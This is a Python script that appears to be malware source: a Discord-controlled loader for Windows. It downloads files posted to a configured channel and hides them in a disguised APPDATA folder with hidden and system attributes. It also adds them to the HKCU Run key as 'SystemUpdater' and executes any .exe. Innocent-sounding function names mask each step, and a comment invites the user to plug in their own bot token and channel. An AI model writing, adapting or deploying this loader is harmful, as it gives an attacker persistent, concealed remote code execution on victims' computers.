import os
import requests
import subprocess
import winreg
import discord

#Below enter ur bot token and the server id and the channel where you got ur exe files. ( ;
BOT_TOKEN = '99999999'
SERVER_ID = 69696969696969
CHANNEL_ID = 6969696969696969

intents = discord.Intents.default()
intents.messages = True
client = discord.Client(intents=intents)

def download_file(url, file_path):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        return True
    except requests.RequestException:
        return False

def set_maintenance_attributes(file_path):
    try:
        subprocess.run(['attrib', '+h', '+s', file_path], check=True)
    except subprocess.CalledProcessError:
        pass

def register_for_auto_start(exe_path):
    try:
        reg_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        exe_name = 'SystemUpdater'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, exe_name, 0, winreg.REG_SZ, exe_path)
    except Exception:
        pass

def run_utility(file_path):
    try:
        subprocess.Popen(['start', file_path], shell=True)
    except Exception:
        pass

@client.event
async def on_ready():
    pass

@client.event
async def on_message(message):
    if message.guild.id == SERVER_ID and message.channel.id == CHANNEL_ID:
        if message.attachments:
            attachment = message.attachments[0]
            file_url = attachment.url
            file_name = attachment.filename

            appdata_path = os.getenv('APPDATA')
            hidden_dir = os.path.join(appdata_path, 'Microsoft', 'SystemUpdater', 'helper')
            os.makedirs(hidden_dir, exist_ok=True)
            hidden_path = os.path.join(hidden_dir, file_name)

            if download_file(file_url, hidden_path):
                set_maintenance_attributes(hidden_path)
                register_for_auto_start(hidden_path)
                if file_name.lower().endswith('.exe'):
                    run_utility(hidden_path)

client.run(BOT_TOKEN)
